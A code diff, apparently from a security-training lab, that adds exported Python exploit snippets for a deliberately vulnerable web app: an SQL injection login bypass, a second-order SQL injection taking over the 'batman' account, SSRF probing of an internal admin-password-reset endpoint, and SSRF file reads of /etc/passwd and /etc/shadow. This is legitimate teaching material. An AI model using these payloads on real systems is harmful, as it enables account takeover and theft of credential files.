@@ -101,7 +101,7 @@ async def submit_webhook(user_supplied_url: UserSuppliedUrl) -> str:
             return Passphrases.ssrf1.value
         else:
             raise HTTPException(
-                status_code=400, detail=f"{response_body}...\n\nFailure"
+                status_code=400, detail=f"{response_body}...\\n\\nFailure"
             )
     except requests.exceptions.RequestException as e:
         raise HTTPException(status_code=400, detail="Failure: " + str(e)) from e`
@@ -156,9 +156,115 @@ async def submit_api_url(user_supplied_url: UserSuppliedUrl) -> str:
             return response_body
         else:
             raise HTTPException(
-                status_code=400, detail=f"{response_body}...\n\nFailure"
+                status_code=400, detail=f"{response_body}...\\n\\nFailure"
             )
     except requests.exceptions.RequestException as e:
         raise HTTPException(status_code=400, detail="Failure: " + str(e)) from e`
 
-export const sqliLoginBypassExploitSnippet = '2cd5ffda86a9f3beee7858fd3ee21b10'
+export const sqliLoginBypassExploitSnippet = `
+username = "administrator"
+password = "' OR 'a' = 'a"
+data = {"username": username, "password": password}
+
+try:
+    req = Request(
+        url,
+        data=json.dumps(data).encode("utf-8"),
+        method="POST",
+        headers={"Content-Type": "application/json"},
+    )
+
+    with urlopen(req) as response:
+        print(f"Response: {response.read().decode('utf-8')}")
+except URLError as e:
+    print(f"Error: {e}")`
+
+export const sqliSecondOrderExploitSnippet = `
+def register(username_to_exploit: str, password: str) -> dict:
+    username = f"{username_to_exploit}';-- "
+    data = {"username": username, "password": password}
+
+    try:
+        req = Request(
+            urls[0],
+            data=json.dumps(data).encode("utf-8"),
+            method="POST",
+            headers={"Content-Type": "application/json"},
+        )
+
+        with urlopen(req) as response:
+            cookies = dict(
+                [
+                    cookie.split("=", 1)
+                    for cookie in response.headers.get("Set-Cookie", "").split("; ")[
+                        0:1
+                    ]
+                ]
+            )
+            print(f"Response: {response.read().decode('utf-8')}")
+            return cookies
+    except URLError as e:
+        print(f"Error: {e}")
+        return {}
+
+
+def change_password(cookies: dict, password: str) -> None:
+    data = {"old": password, "new": password, "new_verify": password}
+
+    try:
+        cookie_string = "; ".join([f"{k}={v}" for k, v in cookies.items()])
+        req = Request(
+            urls[1],
+            data=json.dumps(data).encode("utf-8"),
+            method="POST",
+            headers={"Content-Type": "application/json", "Cookie": cookie_string},
+        )
+
+        with urlopen(req) as response:
+            print(f"Response: {response.read().decode('utf-8')}")
+    except URLError as e:
+        print(f"Error: {e}")
+
+
+password = "gotham"
+username_to_exploit = "batman"
+cookies = register(username_to_exploit, password)
+change_password(cookies, password)`
+
+export const ssrfWebhookExploitSnippet = `
+for url_payload in [
+    "http://internal_api",
+    "http://internal_api:12301",
+    "http://internal_api:12301/reset_admin_password/",
+]:
+    data = {"url": url_payload}
+
+    try:
+        req = Request(
+            url,
+            data=json.dumps(data).encode("utf-8"),
+            method="POST",
+            headers={"Content-Type": "application/json"},
+        )
+
+        with urlopen(req) as response:
+            print(f"Response for {url_payload}: {response.read().decode('utf-8')}")
+    except URLError as e:
+        print(f"Error with {url_payload}: {e}")`
+
+export const ssrfLocalFileInclusionExploitSnippet = `
+for custom_url in ["file:///etc/passwd", "file:///etc/shadow"]:
+    data = {"url": custom_url}
+
+    try:
+        req = Request(
+            url,
+            data=json.dumps(data).encode("utf-8"),
+            method="POST",
+            headers={"Content-Type": "application/json"},
+        )
+
+        with urlopen(req) as response:
+            print(f"Response for {custom_url}: {response.read().decode('utf-8')}")
+    except URLError as e:
+        print(f"Error with {custom_url}: {e}")`
